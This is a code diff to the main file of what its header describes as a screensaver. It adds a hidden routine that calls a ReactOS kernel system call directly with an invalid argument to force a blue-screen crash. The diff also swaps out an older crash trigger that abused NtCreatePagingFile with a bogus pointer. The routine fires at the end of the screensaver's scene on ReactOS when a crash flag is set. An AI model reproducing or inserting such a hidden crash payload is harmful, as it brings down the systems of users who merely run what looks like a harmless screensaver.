@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2018
+*  (C) COPYRIGHT AUTHORS, 2018 - 2019
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.00
+*  VERSION:     1.02
 *
-*  DATE:        29 Dec 2018
+*  DATE:        01 Dec 2019
 *
 *  Screensaver entry point.
 *
@@ -524,22 +524,45 @@ DWORD WINAPI DrawingThread(LPVOID lpThreadParameter)
     return 0;
 }
 
+typedef NTSTATUS(NTAPI *pfnNtUserGetAsyncKeyState)(_In_ INT Key);
+
+#ifndef _WIN64
+__declspec(naked) ULONG NTAPI NtUserGetAsyncKeyStateGate()
+{
+    __asm {
+        mov eax, 0000117Eh
+        mov edx, 7FFE0300h
+        call dword ptr[edx]
+        retn 00000004h
+    }
+}
+#else 
+ULONG NTAPI NtUserGetAsyncKeyStateGate()
+{
+    //PLACEHOLDER, bring callgate here
+    return 0;
+}
+
+#endif
+
+void ROS_NTUSER_BSOD_018()
+{
+    pfnNtUserGetAsyncKeyState NtUserGetAsyncKeyState = 
+        (pfnNtUserGetAsyncKeyState)NtUserGetAsyncKeyStateGate;
+
+    LoadLibrary(TEXT("user32.dll"));
+
+    NtUserGetAsyncKeyState(0x80000000);
+}
+
 /*
 
 S for Surprise
 
 */
-void ROS_NTOS_BSOD_053()
+void BlueScreenieMyReactOS()
 {
-#ifndef _WIN64
-    BOOLEAN bEnabled;
-
-    LARGE_INTEGER li;
-
-    if (NT_SUCCESS(RtlAdjustPrivilege(SE_CREATE_PAGEFILE_PRIVILEGE, TRUE, FALSE, &bEnabled))) {
-        NtCreatePagingFile((PUNICODE_STRING)0xfefefefe, (PLARGE_INTEGER)&li, (PLARGE_INTEGER)&li, 0);
-    }
-#endif
+    ROS_NTUSER_BSOD_018();
 }
 
 /*
@@ -648,7 +671,7 @@ LRESULT WINAPI ScreenSaverProcW(
             ++text_index;
             if (text_index == ROS_SCR_MAX_SCENE_TEXT) {
                 if ((g_IsReactOS) && (g_bCrash)) {
-                    ROS_NTOS_BSOD_053();
+                    BlueScreenieMyReactOS();
                 }
             }
             break;
